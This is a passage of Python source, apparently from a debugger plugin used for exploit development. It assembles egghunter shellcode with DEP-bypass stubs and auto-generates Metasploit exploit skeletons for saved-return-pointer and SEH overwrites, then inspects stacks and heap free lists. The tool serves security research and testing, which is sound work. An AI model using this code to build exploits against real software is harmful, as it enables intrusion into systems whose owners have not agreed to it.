                                getsize += hex2bin(assemble(((('add ' + sizereg) + ',') + sizereg)))
                                vpsize += vpsize
                                depblockcnt += 1
                            delta = (depsize - vpsize)
                            if (delta > 0):
                                getsize += (addreg[sizereg] + hex2bin(('\\x' + toHexByte(delta))))
                        else:
                            getsize += (addreg[sizereg] + hex2bin(('\\x' + toHexByte(depsize))))
                    getsize += hex2bin(assemble(('push ' + sizereg)))
                else:
                    dbg.log('** Shellcode size (depsize) is too big', highlight=1)
                    return
                if (depmethod == 'virtualprotect'):
                    jmppayload = 'Tj@'
                    jmppayload += getsize
                    jmppayload += hex2bin(assemble((('#push edi#push edi#push ' + depreg) + '#ret')))
                elif (depmethod == 'copy'):
                    jmppayload = hex2bin(assemble((((((((('push edi\\push ' + depdest) + '#push ') + depdest) + '#push ') + depreg) + '#mov edi,') + depdest) + '#ret')))
                elif (depmethod == 'copy_size'):
                    jmppayload += getsize
                    jmppayload += hex2bin(assemble((((((((('push edi#push ' + depdest) + '#push ') + depdest) + '#push ') + depreg) + '#mov edi,') + depdest) + '#ret')))
            egghunter += getpc
            egghunter += jmppayload
            startat = ''
            skip = ''
            if (startreg != ''):
                if (startreg != 'edx'):
                    startat = hex2bin(assemble(('mov edx,' + startreg)))
                skip = 'ë\x05'
            egghunter = (skip + egghunter)
            egghunter = (hex2bin(assemble(getpointer)) + egghunter)
            egghunter = (startat + egghunter)
            silent = oldsilent
            egghunter_hex = toniceHex(egghunter.strip().replace(' ', ''), 16)
            global ignoremodules
            ignoremodules = True
            hunterfilename = 'egghunter.txt'
            objegghunterfile = MnLog(hunterfilename)
            egghunterfile = objegghunterfile.reset()
            dbg.log(('[+] Egghunter %s (%d bytes): ' % (extratext, len(egghunter.strip().replace(' ', '')))))
            dbg.logLines(('%s' % egghunter_hex))
            objegghunterfile.write((((('Egghunter ' + extratext) + ', tag ') + egg) + ' : '), egghunterfile)
            objegghunterfile.write(egghunter_hex, egghunterfile)
            if (filename == ''):
                objegghunterfile.write((('Put this tag in front of your shellcode : ' + egg) + egg), egghunterfile)
            else:
                dbg.log('[+] Shellcode, with tag : ')
                block = ((('"' + egg) + egg) + '"\n')
                cnt = 0
                flip = 1
                thisline = '"'
                while (cnt < len(data)):
                    thisline += ('\\x%s' % toHexByte(ord(data[cnt])))
                    if ((flip == 32) or (cnt == (len(data) - 1))):
                        if ((cnt == (len(data) - 1)) and (checksumbyte != '')):
                            thisline += ('\\x%s' % checksumbyte)
                        thisline += '"'
                        flip = 0
                        block += thisline
                        block += '\n'
                        thisline = '"'
                    cnt += 1
                    flip += 1
                dbg.logLines(block)
                objegghunterfile.write('\nShellcode, with tag :\n', egghunterfile)
                objegghunterfile.write(block, egghunterfile)
            ignoremodules = False
            return

        def procFindMSP(args):
            distance = 0
            if ('distance' in args):
                try:
                    distance = int(args['distance'])
                except:
                    distance = 0
            if (distance < 0):
                dbg.log('** Please provide a positive number as distance', highlight=1)
                return
            mspresults = {}
            mspresults = goFindMSP(distance, args)
            return

        def procSuggest(args):
            modulecriteria = {}
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            isEIP = False
            isSEH = False
            isEIPUnicode = False
            isSEHUnicode = False
            initialoffsetSEH = 0
            initialoffsetEIP = 0
            shellcodesizeSEH = 0
            shellcodesizeEIP = 0
            nullsallowed = True
            global ignoremodules
            global noheader
            global ptr_to_get
            global silent
            global ptr_counter
            targetstr = ''
            exploitstr = ''
            originalauthor = ''
            url = ''
            if (dbg.getDebuggedPid() == 0):
                dbg.log("** You don't seem to be attached to an application ! **", highlight=1)
                return
            exploittype = ''
            skeletonarg = ''
            usecliargs = False
            validstypes = {}
            validstypes['tcpclient'] = 'network client (tcp)'
            validstypes['udpclient'] = 'network client (udp)'
            validstypes['fileformat'] = 'fileformat'
            exploittypes = ['fileformat', 'network client (tcp)', 'network client (udp)']
            if ((__DEBUGGERAPP__ == 'WinDBG') or ('t' in args)):
                if ('t' in args):
                    if (type(args['t']).__name__.lower() != 'bool'):
                        skeltype = args['t'].lower()
                        skelparts = skeltype.split(':')
                        if (skelparts[0] in validstypes):
                            exploittype = validstypes[skelparts[0]]
                            if (len(skelparts) > 1):
                                skeletonarg = skelparts[1]
                            else:
                                dbg.log(' ** Please specify the skeleton type AND an argument. **')
                                return
                            usecliargs = True
                        else:
                            dbg.log(' ** Please specify a valid skeleton type and an argument. **')
                            return
                    else:
                        dbg.log(' ** Please specify a skeletontype using -t **', highlight=1)
                        return
                else:
                    dbg.log(' ** Please specify a skeletontype using -t **', highlight=1)
                    return
            mspresults = {}
            mspresults = goFindMSP(100, args)
            exploitfilename = 'exploit.rb'
            objexploitfile = MnLog(exploitfilename)
            noheader = True
            ignoremodules = True
            exploitfile = objexploitfile.reset()
            ignoremodules = False
            noheader = False
            dbg.log(' ')
            dbg.log('[+] Preparing payload...')
            dbg.log(' ')
            dbg.updateLog()
            if ('registers' in mspresults):
                for reg in mspresults['registers']:
                    if (reg.upper() == 'EIP'):
                        isEIP = True
                        eipval = mspresults['registers'][reg][0]
                        ptrx = MnPointer(eipval)
                        initialoffsetEIP = mspresults['registers'][reg][1]
            if ('seh' in mspresults):
                if (len(mspresults['seh']) > 0):
                    isSEH = True
                    for seh in mspresults['seh']:
                        if (mspresults['seh'][seh][2] == 'unicode'):
                            isSEHUnicode = True
                        if (not isSEHUnicode):
                            initialoffsetSEH = mspresults['seh'][seh][1]
                        else:
                            initialoffsetSEH = mspresults['seh'][seh][1]
                        shellcodesizeSEH = mspresults['seh'][seh][3]
            if isSEH:
                ignoremodules = True
                noheader = True
                exploitfilename_seh = 'exploit_seh.rb'
                objexploitfile_seh = MnLog(exploitfilename_seh)
                exploitfile_seh = objexploitfile_seh.reset()
                ignoremodules = False
                noheader = False
            if ((not isEIP) and (not isSEH)):
                dbg.log(" ** Unable to suggest anything useful. You don't seem to control EIP or SEH ** ", highlight=1)
                return
            if (not usecliargs):
                dbg.log(' ** Please select a skeleton exploit type from the dropdown list **', highlight=1)
                exploittype = dbg.comboBox('Select msf exploit skeleton to build :', exploittypes).lower().strip()
            if (not (exploittype in exploittypes)):
                dbg.log('Boo - invalid exploit type, try again !', highlight=1)
                return
            portnr = 0
            extension = ''
            if (exploittype.find('network') > (- 1)):
                if usecliargs:
                    portnr = skeletonarg
                else:
                    portnr = dbg.inputBox('Remote port number : ')
                try:
                    portnr = int(portnr)
                except:
                    portnr = 0
            if (exploittype.find('fileformat') > (- 1)):
                if usecliargs:
                    extension = skeletonarg
                else:
                    extension = dbg.inputBox('File extension :')
            extension = extension.replace("'", '').replace('"', '').replace('\n', '').replace('\r', '')
            if (not extension.startswith('.')):
                extension = ('.' + extension)
            dbg.createLogWindow()
            dbg.updateLog()
            url = ''
            badchars = ''
            if ('badchars' in criteria):
                badchars = criteria['badchars']
            if ('nonull' in criteria):
                if (not ('\x00' in badchars)):
                    badchars += '\x00'
            (skeletonheader, skeletoninit, skeletoninit2) = getSkeletonHeader(exploittype, portnr, extension, url, badchars)
            regsto = ''
            if isEIP:
                dbg.log('[+] Attempting to create payload for saved return pointer overwrite...')
                largestreg = ''
                largestsize = 0
                offsetreg = 0
                regptr = 0
                eipcriteria = criteria
                modulecriteria['aslr'] = False
                modulecriteria['rebase'] = False
                modulecriteria['os'] = False
                jmp_pointers = {}
                jmppointer = 0
                instrinfo = ''
                if isEIPUnicode:
                    eipcriteria['unicode'] = True
                    eipcriteria['nonull'] = False
                if ('registers_to' in mspresults):
                    for reg in mspresults['registers_to']:
                        regsto += (reg + ',')
                        thissize = mspresults['registers_to'][reg][2]
                        thisreg = reg
                        thisoffset = mspresults['registers_to'][reg][1]
                        thisregptr = mspresults['registers_to'][reg][0]
                        if (thisoffset < initialoffsetEIP):
                            thissize = (initialoffsetEIP - thisoffset)
                        if (thissize > largestsize):
                            silent = True
                            ptr_counter = 0
                            ptr_to_get = 1
                            jmp_pointers = findJMP(modulecriteria, eipcriteria, reg.lower())
                            if (len(jmp_pointers) == 0):
                                ptr_counter = 0
                                ptr_to_get = 1
                                modulecriteria['os'] = True
                                jmp_pointers = findJMP(modulecriteria, eipcriteria, reg.lower())
                            modulecriteria['os'] = False
                            if (len(jmp_pointers) > 0):
                                largestsize = thissize
                                largestreg = thisreg
                                offsetreg = thisoffset
                                regptr = thisregptr
                            silent = False
                regsto = regsto.rstrip(',')
                if (largestreg == ''):
                    dbg.log(("    Payload is referenced by at least one register (%s), but I couldn't seem to find" % regsto), highlight=1)
                    dbg.log('    a way to jump to that register', highlight=1)
                else:
                    for ptrtype in jmp_pointers:
                        jmppointer = jmp_pointers[ptrtype][0]
                        instrinfo = ptrtype
                        break
                    ptrx = MnPointer(jmppointer)
                    modname = ptrx.belongsTo()
                    targetstr = "      'Targets'    =>\n"
                    targetstr += '        [\n'
                    targetstr += "          [ '<fill in the OS/app version here>',\n"
                    targetstr += '            {\n'
                    if (not isEIPUnicode):
                        targetstr += (((((("              'Ret'     =>  0x" + toHex(jmppointer)) + ', # ') + instrinfo) + ' - ') + modname) + '\n')
                        targetstr += (("              'Offset'  =>  " + str(initialoffsetEIP)) + '\n')
                    else:
                        origptr = toHex(jmppointer)
                        unicodeptr = ''
                        transforminfo = ''
                        if ((origptr[0] == '0') and (origptr[1] == '0') and (origptr[4] == '0') and (origptr[5] == '0')):
                            unicodeptr = (((((('"\\x' + origptr[6]) + origptr[7]) + '\\x') + origptr[2]) + origptr[3]) + '"')
                        else:
                            transform = UnicodeTransformInfo(origptr)
                            transformparts = transform.split(',')
                            transformsubparts = transformparts[0].split(' ')
                            origptr = transformsubparts[(len(transformsubparts) - 1)]
                            transforminfo = (' #unicode transformed to 0x' + toHex(jmppointer))
                            unicodeptr = (((((('"\\x' + origptr[6]) + origptr[7]) + '\\x') + origptr[2]) + origptr[3]) + '"')
                        targetstr += (((((((("              'Ret'     =>  " + unicodeptr) + ',') + transforminfo) + '# ') + instrinfo) + ' - ') + modname) + '\n')
                        targetstr += (("              'Offset'  =>  " + str(initialoffsetEIP)) + '  #Unicode\n')
                    targetstr += '            }\n'
                    targetstr += '          ],\n'
                    targetstr += '        ],\n'
                    exploitstr = '  def exploit\n\n'
                    if (exploittype.find('network') > (- 1)):
                        if (exploittype.find('tcp') > (- 1)):
                            exploitstr += '\n    connect\n\n'
                        elif (exploittype.find('udp') > (- 1)):
                            exploitstr += '\n    connect_udp\n\n'
                    if (initialoffsetEIP < offsetreg):
                        exploitstr += "    buffer =  rand_text(target['Offset'])  \n"
                        if (not isEIPUnicode):
                            exploitstr += "    buffer << [target.ret].pack('V')  \n"
                        else:
                            exploitstr += "    buffer << target['Ret']  #Unicode friendly jump\n\n"
                        if (offsetreg > (initialoffsetEIP + 2)):
                            if (not isEIPUnicode):
                                if (((offsetreg - initialoffsetEIP) - 4) > 0):
                                    exploitstr += (('    buffer << rand_text(' + str(((offsetreg - initialoffsetEIP) - 4))) + ')  #junk\n')
                            elif ((((offsetreg - initialoffsetEIP) - 4) / 2) > 0):
                                exploitstr += (('    buffer << rand_text(' + str((((offsetreg - initialoffsetEIP) - 4) / 2))) + ')  #unicode junk\n')
                        stackadjust = 0
                        if (largestreg.upper() == 'ESP'):
                            if (not isEIPUnicode):
                                exploitstr += "    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption\n"
                                stackadjust = 6
                                exploitstr += (('    buffer << payload.encoded  #max ' + str((largestsize - stackadjust))) + ' bytes\n')
                        if isEIPUnicode:
                            exploitstr += '    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n'
                            exploitstr += '    # and then manually encode with unicode inside the exploit section :\n\n'
                            exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
                            exploitstr += (("    register_to_align_to = '" + largestreg.upper()) + "'\n\n")
                            if (largestreg.upper() == 'ESP'):
                                exploitstr += '    # Note : since you are using ESP as bufferregister, make sure EBP points to a writeable address !\n'
                                exploitstr += '    # or patch the unicode decoder yourself\n'
                            exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
                            exploitstr += '    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n'
                            exploitstr += '    buffer << unicodepayload'
                    else:
                        beforeEIP = (initialoffsetEIP - offsetreg)
                        if (beforeEIP > 0):
                            if (offsetreg > 0):
                                exploitstr += (((('    buffer = rand_text(' + str(offsetreg)) + ')  #offset to ') + largestreg) + '\n')
                                exploitstr += (('    buffer << payload.encoded  #max ' + str((initialoffsetEIP - offsetreg))) + ' bytes\n')
                                exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
                                exploitstr += "    buffer << [target.ret].pack('V')  \n"
                            else:
                                exploitstr += (('    buffer = payload.encoded  #max ' + str((initialoffsetEIP - offsetreg))) + ' bytes\n')
                                exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
                                exploitstr += "    buffer << [target.ret].pack('V')  \n"
                    if (exploittype.find('network') > (- 1)):
                        exploitstr += '\n    print_status("Trying target #{target.name}...")\n'
                        if (exploittype.find('tcp') > (- 1)):
                            exploitstr += '    sock.put(buffer)\n'
                            exploitstr += '\n    handler\n'
                        elif (exploittype.find('udp') > (- 1)):
                            exploitstr += '    udp_sock.put(buffer)\n'
                            exploitstr += '\n    handler(udp_sock)\n'
                    if (exploittype == 'fileformat'):
                        exploitstr += '\n    file_create(buffer)\n\n'
                    if (exploittype.find('network') > (- 1)):
                        exploitstr += '    disconnect\n\n'
                    exploitstr += '  end\n'
                    dbg.log("Metasploit 'Targets' section :")
                    dbg.log('------------------------------')
                    dbg.logLines(targetstr.replace('  ', '    '))
                    dbg.log('')
                    dbg.log("Metasploit 'exploit' function :")
                    dbg.log('--------------------------------')
                    dbg.logLines(exploitstr.replace('  ', '    '))
                    objexploitfile.write((skeletonheader + '\n'), exploitfile)
                    objexploitfile.write((skeletoninit + '\n'), exploitfile)
                    objexploitfile.write(targetstr, exploitfile)
                    objexploitfile.write(skeletoninit2, exploitfile)
                    objexploitfile.write(exploitstr, exploitfile)
                    objexploitfile.write('end', exploitfile)
            if isSEH:
                dbg.log('[+] Attempting to create payload for SEH record overwrite...')
                sehcriteria = criteria
                modulecriteria['safeseh'] = False
                modulecriteria['rebase'] = False
                modulecriteria['aslr'] = False
                modulecriteria['os'] = False
                sehptr = 0
                instrinfo = ''
                if isSEHUnicode:
                    sehcriteria['unicode'] = True
                    if ('nonull' in sehcriteria):
                        sehcriteria.pop('nonull')
                modulecriteria['safeseh'] = False
                silent = True
                ptr_counter = 0
                ptr_to_get = 1
                seh_pointers = findSEH(modulecriteria, sehcriteria)
                jmpback = False
                silent = False
                if (not isSEHUnicode):
                    if (len(seh_pointers) == 0):
                        dbg.log("[+] No non-null pointers found, trying 'jump back' layout now...")
                        if ('nonull' in sehcriteria):
                            if (sehcriteria['nonull'] == True):
                                sehcriteria.pop('nonull')
                                silent = True
                                ptr_counter = 0
                                ptr_to_get = 1
                                seh_pointers = findSEH(modulecriteria, sehcriteria)
                                silent = False
                                jmpback = True
                    if (len(seh_pointers) != 0):
                        for ptrtypes in seh_pointers:
                            sehptr = seh_pointers[ptrtypes][0]
                            instrinfo = ptrtypes
                            break
                elif (len(seh_pointers) == 0):
                    sehptr = 0
                else:
                    for ptrtypes in seh_pointers:
                        sehptr = seh_pointers[ptrtypes][0]
                        instrinfo = ptrtypes
                        break
                if (sehptr != 0):
                    ptrx = MnPointer(sehptr)
                    modname = ptrx.belongsTo()
                    mixin = ''
                    if (not jmpback):
                        mixin += "#Don't forget to include the SEH mixin !\n"
                        mixin += 'include Msf::Exploit::Seh\n\n'
                        skeletonheader += '  include Msf::Exploit::Seh\n'
                    targetstr = "      'Targets'    =>\n"
                    targetstr += '        [\n'
                    targetstr += "          [ '<fill in the OS/app version here>',\n"
                    targetstr += '            {\n'
                    if (not isSEHUnicode):
                        targetstr += (((((("              'Ret'     =>  0x" + toHex(sehptr)) + ', # ') + instrinfo) + ' - ') + modname) + '\n')
                        targetstr += (("              'Offset'  =>  " + str(initialoffsetSEH)) + '\n')
                    else:
                        origptr = toHex(sehptr)
                        unicodeptr = ''
                        transforminfo = ''
                        if ((origptr[0] == '0') and (origptr[1] == '0') and (origptr[4] == '0') and (origptr[5] == '0')):
                            unicodeptr = (((((('"\\x' + origptr[6]) + origptr[7]) + '\\x') + origptr[2]) + origptr[3]) + '"')
                        else:
                            transform = UnicodeTransformInfo(origptr)
                            transformparts = transform.split(',')
                            transformsubparts = transformparts[0].split(' ')
                            origptr = transformsubparts[(len(transformsubparts) - 1)]
                            transforminfo = (' #unicode transformed to 0x' + toHex(sehptr))
                            unicodeptr = (((((('"\\x' + origptr[6]) + origptr[7]) + '\\x') + origptr[2]) + origptr[3]) + '"')
                        targetstr += (((((((("              'Ret'     =>  " + unicodeptr) + ',') + transforminfo) + ' # ') + instrinfo) + ' - ') + modname) + '\n')
                        targetstr += (("              'Offset'  =>  " + str(initialoffsetSEH)) + '  #Unicode\n')
                    targetstr += '            }\n'
                    targetstr += '          ],\n'
                    targetstr += '        ],\n'
                    exploitstr = '  def exploit\n\n'
                    if (exploittype.find('network') > (- 1)):
                        exploitstr += '\n    connect\n\n'
                    if (not isSEHUnicode):
                        if (not jmpback):
                            exploitstr += "    buffer = rand_text(target['Offset'])  #junk\n"
                            exploitstr += '    buffer << generate_seh_record(target.ret)\n'
                            exploitstr += (('    buffer << payload.encoded  #' + str(shellcodesizeSEH)) + ' bytes of space\n')
                            exploitstr += '    # more junk may be needed to trigger the exception\n'
                        else:
                            exploitstr += '    jmp_back = Rex::Arch::X86.jmp_short(-payload.encoded.length-5)\n\n'
                            exploitstr += "    buffer = rand_text(target['Offset'] - payload.encoded.length - jmp_back.length)  #junk\n"
                            exploitstr += '    buffer << payload.encoded\n'
                            exploitstr += '    buffer << jmp_back  #jump back to start of payload.encoded\n'
                            exploitstr += "    buffer << '\\xeb\\xf9\\x41\\x41'  #nseh, jump back to jmp_back\n"
                            exploitstr += "    buffer << [target.ret].pack('V')  #seh\n"
                    else:
                        exploitstr += '    nseh = <insert 2 bytes that will acts as nseh walkover>\n'
                        exploitstr += '    align = <insert routine to align a register to begin of payload and jump to it>\n\n'
                        exploitstr += '    padding = <insert bytes to fill space between alignment code and payload>\n\n'
                        exploitstr += '    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n'
                        exploitstr += '    # and then manually encode with unicode inside the exploit section :\n\n'
                        exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
                        exploitstr += '    register_to_align_to = <fill in the register name you will align to>\n\n'
                        exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
                        exploitstr += '    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n'
                        exploitstr += "    buffer = rand_text(target['Offset'])  #unicode junk\n"
                        exploitstr += '    buffer << nseh  #Unicode walkover friendly dword\n'
                        exploitstr += "    buffer << target['Ret']  #Unicode friendly p/p/r\n"
                        exploitstr += '    buffer << align\n'
                        exploitstr += '    buffer << padding\n'
                        exploitstr += '    buffer << unicodepayload\n'
                    if (exploittype.find('network') > (- 1)):
                        exploitstr += '\n    print_status("Trying target #{target.name}...")\n'
                        exploitstr += '    sock.put(buffer)\n\n'
                        exploitstr += '    handler\n'
                    if (exploittype == 'fileformat'):
                        exploitstr += '\n    file_create(buffer)\n\n'
                    if (exploittype.find('network') > (- 1)):
                        exploitstr += '    disconnect\n\n'
                    exploitstr += '  end\n'
                    if (mixin != ''):
                        dbg.log("Metasploit 'include' section :")
                        dbg.log('------------------------------')
                        dbg.logLines(mixin)
                    dbg.log("Metasploit 'Targets' section :")
                    dbg.log('------------------------------')
                    dbg.logLines(targetstr.replace('  ', '    '))
                    dbg.log('')
                    dbg.log("Metasploit 'exploit' function :")
                    dbg.log('--------------------------------')
                    dbg.logLines(exploitstr.replace('  ', '    '))
                    objexploitfile_seh.write((skeletonheader + '\n'), exploitfile_seh)
                    objexploitfile_seh.write((skeletoninit + '\n'), exploitfile_seh)
                    objexploitfile_seh.write(targetstr, exploitfile_seh)
                    objexploitfile_seh.write(skeletoninit2, exploitfile_seh)
                    objexploitfile_seh.write(exploitstr, exploitfile_seh)
                    objexploitfile_seh.write('end', exploitfile_seh)
                else:
                    dbg.log("    Unable to suggest a buffer layout because I couldn't find any good pointers", highlight=1)
            return

        def procStacks(args):
            stacks = getStacks()
            if (len(stacks) > 0):
                dbg.log('Stacks :')
                dbg.log('--------')
                for threadid in stacks:
                    dbg.log(('Thread %s : Stack : 0x%s - 0x%s (size : 0x%s)' % (str(threadid), toHex(stacks[threadid][0]), toHex(stacks[threadid][1]), toHex((stacks[threadid][1] - stacks[threadid][0])))))
            else:
                dbg.log('No threads/stacks found !', highlight=1)
            return

        def procHeap(args):
            os = dbg.getOsVersion()
            heapkey = 0
            allheaps = []
            try:
                allheaps = dbg.getHeapsAddress()
            except:
                allheaps = []
            dbg.log(('Peb : 0x%08x, NtGlobalFlag : 0x%08x' % (dbg.getPEBAddress(), getNtGlobalFlag())))
            dbg.log('Heaps:')
            dbg.log('------')
            if (len(allheaps) > 0):
                for heap in allheaps:
                    segments = getSegmentList(heap)
                    segmentlist = []
                    for segment in segments:
                        segmentlist.append(segment)
                    if (not win7mode):
                        segmentlist.sort()
                    segmentinfo = ''
                    for segment in segmentlist:
                        segmentinfo = ((segmentinfo + ('0x%08x' % segment)) + ',')
                    segmentinfo = segmentinfo.strip(',')
                    segmentinfo = (' : ' + segmentinfo)
                    defheap = ''
                    lfhheap = ''
                    keyinfo = ''
                    if (heap == getDefaultProcessHeap()):
                        defheap = '* Default process heap'
                    if win7mode:
                        iHeap = MnHeap(heap)
                        if iHeap.usesLFH():
                            lfhheapaddress = iHeap.getLFHAddress()
                            lfhheap = ('[LFH enabled, _LFH_HEAP at 0x%08x]' % lfhheapaddress)
                        if (iHeap.getEncodingKey() > 0):
                            keyinfo = ('Encoding key: 0x%08x' % iHeap.getEncodingKey())
                    dbg.log(('0x%08x (%d segment(s)%s) %s %s %s' % (heap, len(segments), segmentinfo, defheap, lfhheap, keyinfo)))
            else:
                dbg.log(' ** No heaps found')
            dbg.log('')
            heapbase = 0
            searchtype = ''
            searchtypes = ['lal', 'lfh', 'all', 'segments', 'chunks', 'layout', 'fea', 'bea']
            error = False
            filterafter = ''
            showdata = False
            findvtablesize = True
            expand = False
            minstringlength = 32
            if (len(allheaps) > 0):
                if (('h' in args) and (type(args['h']).__name__.lower() != 'bool')):
                    hbase = args['h'].replace('0x', '').replace('0X', '')
                    if (not (isAddress(hbase) or (hbase.lower() == 'default'))):
                        dbg.log(('%s is an invalid address' % args['h']), highlight=1)
                        return
                    elif (hbase.lower() == 'default'):
                        heapbase = getDefaultProcessHeap()
                    else:
                        heapbase = hexStrToInt(hbase)
                if ('t' in args):
                    if (type(args['t']).__name__.lower() != 'bool'):
                        searchtype = args['t'].lower().replace('"', '').replace("'", '')
                        if (searchtype == 'blocks'):
                            dbg.log("** Note : type 'blocks' has been replaced with 'chunks'", highlight=1)
                            dbg.log('')
                            searchtype = 'chunks'
                        if (not (searchtype in searchtypes)):
                            searchtype = ''
                    else:
                        searchtype = ''
                if ('after' in args):
                    if (type(args['after']).__name__.lower() != 'bool'):
                        filterafter = args['after'].replace('"', '').replace("'", '')
                if ('v' in args):
                    showdata = True
                if ('expand' in args):
                    expand = True
                if ('fast' in args):
                    findvtablesize = False
                    showdata = False
                if ((searchtype == '') and (not ('stat' in args))):
                    dbg.log('Please specify a valid searchtype -t', highlight=1)
                    dbg.log('Valid values are :', highlight=1)
                    for val in searchtypes:
                        if (val != 'blocks'):
                            dbg.log(('   %s' % val), highlight=1)
                    error = True
                if (('h' in args) and (heapbase == 0)):
                    dbg.log('Please specify a valid heap base address -h', highlight=1)
                    error = True
                if ('size' in args):
                    if (type(args['size']).__name__.lower() != 'bool'):
                        size = args['size'].lower()
                        if size.startswith('0x'):
                            minstringlength = hexStrToInt(size)
                        else:
                            minstringlength = int(size)
                    else:
                        dbg.log('Please provide a valid size -size', highlight=1)
                        error = True
                if ('clearcache' in args):
                    dbg.forgetKnowledge('vtableCache')
                    dbg.log('[+] vtableCache cleared.')
            else:
                dbg.log('No heaps found', highlight=1)
                return
            heap_to_query = []
            heapfound = False
            if ('h' in args):
                for heap in allheaps:
                    if (heapbase == heap):
                        heapfound = True
                        heap_to_query = [heapbase]
                if (not heapfound):
                    error = True
                    dbg.log(('0x%08x is not a valid heap base address' % heapbase), highlight=1)
            else:
                for heap in allheaps:
                    heap_to_query.append(heap)
            if error:
                return
            else:
                statinfo = {}
                logfile_b = ''
                thislog_b = ''
                logfile_l = ''
                logfile_l = ''
                if ((searchtype == 'chunks') or (searchtype == 'all')):
                    logfile_b = MnLog('heapchunks.txt')
                    thislog_b = logfile_b.reset()
                if ((searchtype == 'layout') or (searchtype == 'all')):
                    logfile_l = MnLog('heaplayout.txt')
                    thislog_l = logfile_l.reset()
                for heapbase in heap_to_query:
                    mHeap = MnHeap(heapbase)
                    heapbase_extra = ''
                    frontendinfo = []
                    frontendheapptr = 0
                    frontendheaptype = 0
                    if win7mode:
                        heapkey = mHeap.getEncodingKey()
                        if mHeap.usesLFH():
                            frontendheaptype = 2
                            heapbase_extra = ' [LFH] '
                            frontendheapptr = mHeap.getLFHAddress()
                    frontendinfo = [frontendheaptype, frontendheapptr]
                    dbg.log('')
                    dbg.log(('[+] Processing heap 0x%08x%s' % (heapbase, heapbase_extra)))
                    if (searchtype == 'fea'):
                        if win7mode:
                            searchtype = 'lfh'
                        else:
                            searchtype = 'lal'
                    if (searchtype == 'bea'):
                        searchtype = 'freelist'
                    if ((searchtype == 'lal') or ((searchtype == 'all') and (not win7mode))):
                        lalindex = 0
                        if win7mode:
                            dbg.log(" !! This version of the OS doesn't have a LookAside List !!")
                        else:
                            dbg.log('[+] FrontEnd Allocator : LookAsideList')
                            dbg.log(('[+] Getting LookAsideList for heap 0x%08x' % heapbase))
                            FrontEndHeap = mHeap.getFrontEndHeap()
                            if (FrontEndHeap > 0):
                                dbg.log(('    FrontEndHeap: 0x%08x' % FrontEndHeap))
                                fea_lal = mHeap.getLookAsideList()
                                dbg.log(('    Nr of (non-empty) LookAside Lists : %d' % len(fea_lal)))
                                dbg.log('')
                                for lal_table_entry in sorted(fea_lal.keys()):
                                    expectedsize = (lal_table_entry * 8)
                                    nr_of_chunks = len(fea_lal[lal_table_entry])
                                    lalhead = struct.unpack('<L', dbg.readMemory((FrontEndHeap + (48 * lal_table_entry)), 4))[0]
                                    dbg.log(('LAL [%d] @0x%08x, Expected Chunksize 0x%x (%d), Flink : 0x%08x' % (lal_table_entry, (FrontEndHeap + (48 * lal_table_entry)), expectedsize, expectedsize, lalhead)))
                                    mHeap.showLookAsideHead(lal_table_entry)
                                    dbg.log(('  %d chunks:' % nr_of_chunks))
                                    for chunkindex in fea_lal[lal_table_entry]:
                                        lalchunk = fea_lal[lal_table_entry][chunkindex]
                                        chunksize = (lalchunk.size * 8)
                                        flag = getHeapFlag(lalchunk.flag)
                                        data = ''
                                        if showdata:
                                            data = bin2hex(dbg.readMemory(lalchunk.userptr, 16))
                                        dbg.log(('     ChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, Userspace: 0x%x (%s) %s' % (lalchunk.chunkptr, lalchunk.userptr, lalchunk.flink, chunksize, lalchunk.usersize, (lalchunk.usersize + lalchunk.remaining), flag, data)))
                                        if (chunksize != expectedsize):
                                            dbg.log('               ^^ ** Warning - unexpected size value, header corrupted ? **', highlight=True)
                                    dbg.log('')
                            else:
                                dbg.log('[+] No LookAsideList found for this heap')
                                dbg.log('')
                    if ((searchtype == 'lfh') or ((searchtype == 'all') and win7mode)):
                        dbg.log('[+] FrontEnd Allocator : Low Fragmentation Heap')
                        dbg.log('     ** Not implemented yet **')
                    if ((searchtype == 'freelist') or ((searchtype == 'all') and (not win7mode))):
                        flindex = 0
                        dbg.log('[+] BackEnd Allocator : FreeLists')
                        dbg.log(('[+] Getting FreeLists for heap 0x%08x' % heapbase))
                        thisfreelist = mHeap.getFreeList()
                        thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()
                        bitmapstr = ''
                        for bit in thisfreelistinusebitmap:
                            bitmapstr += str(bit)
                        dbg.log('[+] FreeListsInUseBitmap:')
                        printDataArray(bitmapstr, 32, prefix='    ')
                        flindex = 0
                        while (flindex < 128):
                            if (flindex in thisfreelist):
                                freelist_addy = ((heapbase + 376) + (8 * flindex))
                                expectedsize = '>1016'
                                expectedsize2 = ('>0x%x' % 1016)
                                if (flindex != 0):
                                    expectedsize2 = str((8 * flindex))
                                    expectedsize = ('0x%x' % (8 * flindex))
                                dbg.log(('[+] FreeList[%02d] at 0x%08x, Expected size: %s (%s)' % (flindex, freelist_addy, expectedsize, expectedsize2)))
                                flindicator = 0
                                for flentry in thisfreelist[flindex]:
                                    freelist_chunk = thisfreelist[flindex][flentry]
                                    chunksize = (freelist_chunk.size * 8)
                                    dbg.log(('     ChunkPtr: 0x%08x, Header: 0x%x bytes, UserPtr: 0x%08x, Flink: 0x%08x, Blink: 0x%08x, ChunkSize: 0x%x (%d), Usersize: 0x%x (%d) ' % (freelist_chunk.chunkptr, freelist_chunk.headersize, freelist_chunk.userptr, freelist_chunk.flink, freelist_chunk.blink, chunksize, chunksize, freelist_chunk.usersize, freelist_chunk.usersize)))
                                    if ((flindex != 0) and (chunksize != (8 * flindex))):
                                        dbg.log('     ** Header may be corrupted! **', highlight=True)
                                    flindicator = 1
